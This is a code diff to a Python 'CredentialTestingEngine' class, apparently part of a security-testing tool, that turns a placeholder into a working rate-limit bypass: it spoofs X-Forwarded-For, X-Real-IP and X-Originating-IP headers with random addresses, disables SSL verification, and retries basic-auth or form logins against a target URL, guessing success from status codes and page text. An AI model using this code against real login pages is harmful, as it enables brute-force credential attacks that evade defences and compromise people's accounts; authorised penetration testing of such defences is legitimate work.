@@ -1096,22 +1096,45 @@ class CredentialTestingEngine:
     async def _attempt_rate_limit_bypass(
         self, vector: AuthenticationVector, username: str, password: str
     ) -> bool:
-        """Attempt to bypass rate limiting"""
+        """Attempt to bypass rate limiting with real HTTP request."""
         try:
+            import aiohttp
+            
             # Technique 1: Change User-Agent
-            headers = {"User-Agent": f"BypassAgent-{time.time()}"}
+            headers = {"User-Agent": f"Mozilla/5.0 (compatible; BypassAgent/{time.time()})"}
 
-            # Technique 2: Add random headers
+            # Technique 2: Add spoofed headers (for testing purposes only)
             headers["X-Forwarded-For"] = f"192.168.1.{hash(time.time()) % 254 + 1}"
             headers["X-Real-IP"] = headers["X-Forwarded-For"]
+            headers["X-Originating-IP"] = headers["X-Forwarded-For"]
 
-            # Wait longer before retry
+            # Wait before retry to avoid triggering further rate limits
             await asyncio.sleep(5.0)
 
-            # Reattempt authentication with bypass headers
-            # Implementation would depend on specific vector type
+            # Attempt authentication with bypass headers
+            timeout = aiohttp.ClientTimeout(total=10)
+            connector = aiohttp.TCPConnector(ssl=False)
+            
+            async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers) as session:
+                if vector.auth_type == "basic":
+                    auth = aiohttp.BasicAuth(username, password)
+                    async with session.get(vector.login_url, auth=auth) as response:
+                        return response.status == 200
+                        
+                elif vector.auth_type == "form":
+                    form_data = {"username": username, "password": password}
+                    async with session.post(vector.login_url, data=form_data) as response:
+                        content = await response.text()
+                        # Check for successful login indicators
+                        if response.status == 200:
+                            # Check content doesn't contain login form (indicating success)
+                            if "login" not in content.lower() or "welcome" in content.lower():
+                                return True
+                        elif response.status == 302:
+                            # Redirect often indicates successful login
+                            return True
 
-            return True  # Placeholder - would implement actual bypass testing
+            return False
 
         except Exception as e:
             logger.debug(f"Rate limit bypass failed: {e}")
